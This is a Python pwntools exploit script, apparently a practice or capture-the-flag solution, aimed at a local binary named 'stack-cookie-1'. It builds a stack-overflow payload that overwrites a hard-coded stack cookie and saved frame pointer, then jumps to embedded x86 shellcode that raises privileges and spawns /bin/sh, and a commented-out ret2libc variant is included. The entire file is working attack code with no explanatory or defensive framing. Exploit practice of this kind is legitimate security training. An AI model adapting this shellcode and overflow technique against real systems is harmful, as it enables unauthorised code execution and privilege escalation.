#!/usr/bin/env python

from pwn import *

# p = process("./stack-cookie-x")
p = process("./stack-cookie-1")

# context.terminal = ['tmux', 'splitw', '-v']
# gdb.attach(p, "b system")
# gdb.attach(p, "b *input_func+50")

# address of system is 0xf7e39da0
# sys_addr = p32(0xf7e39da0)

# /bin/sh is stored at 0xf7f5aa0b
sh = "j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80"
# sh = p32(0xf7f5aa0b)

c = Core('core')
shellcode_addr = c.stack.find(sh)
shellcode_addr = p32(shellcode_addr)

# stack cookie
stack_cookie = p32(0xfaceb00c)
saved_ebp = p32(0xffffc4f8)

# buffer begins at $ebp - 0x88
buf = "A" * (0x84 - len(sh) - 0x4)

print(p.recv())

p.sendline("gaze" + sh + buf + stack_cookie + saved_ebp + (shellcode_addr))
# p.sendline(buf + stack_cookie + "\x00"*4 + sys_addr + "\x00"*4 + sh + "\x00"*4)

p.interactive()
